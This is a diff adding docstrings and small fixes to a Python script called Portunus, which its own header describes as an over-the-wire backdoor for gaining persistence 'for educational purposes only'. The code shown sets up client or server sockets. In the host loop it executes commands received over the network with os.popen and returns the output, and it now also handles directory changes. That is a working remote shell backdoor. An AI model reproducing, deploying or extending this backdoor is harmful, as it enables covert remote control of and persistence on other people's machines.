@@ -3,8 +3,17 @@ import os
 import getpass
 import socket
 
+"""
+Portunus is a over the wire backdoor that can be installed on machines to gain persistence FOR EDUCATIONAL PURPOSES ONLY
+author:     1nv8rZim
+language:   Python 3.8
+"""
+
 
 def parse_args():
+    """
+    Created argparse object to parse command line arguments
+    """
     parser = argparse.ArgumentParser(
         description="creates a backdoor to install on a system to gain persistence")
     client_server = parser.add_mutually_exclusive_group()
@@ -29,6 +38,9 @@ def parse_args():
 
 
 def run_shell():
+    """
+    Runs mainloop for interactions in personal system
+    """
     os.chdir(os.getcwd())
     while True:
         command = input(getpass.getuser() + '@' + os.uname()
@@ -47,6 +59,13 @@ def run_shell():
 
 
 def make_connection(ip, port, is_tcp, is_client):
+    """
+    Creates socket or serversocker connection
+    :param: ip          ip address where socket connection will be made
+    :param: port        port that socket connection will be made on
+    :param: is_tcp      boolean of whether the connection is tcp based
+    :param: is_client   boolean of whether the connection is the client
+    """
     print('[+] creating socket' if is_client else '[+] creating server socket')
     try:
         s = socket.socket(
@@ -70,6 +89,10 @@ def make_connection(ip, port, is_tcp, is_client):
 
 
 def client_communication(sock):
+    """
+    Main loop for client communication with a serversocket on another host
+    :param: sock    socket connection to server
+    """
     while True:
         command = input(getpass.getuser() + '@' + os.uname()
                         [1].split('.')[0] + ' ' + os.getcwd().split('/')[-1] + "> ")
@@ -89,6 +112,10 @@ def client_communication(sock):
 
 
 def host_communication(sock):
+    """
+    Main loop for client communication with a client connection
+    :param: sock    socket connection that client will communicate with
+    """
     while True:
         try:
             command = ''
@@ -100,11 +127,19 @@ def host_communication(sock):
             if command == 'quit' or command == 'exit':
                 break
             sock.send(os.popen(command).read().encode())
+            if command[:3] == 'cd ':
+                try:
+                    os.chdir(command[3:])
+                except:
+                    pass
         except:
-            pass
+            sock.send("[+] Communication error")
 
 
 def main():
+    """
+    Main meathod of portunus.py
+    """
     parse_args()
     run_shell()
 
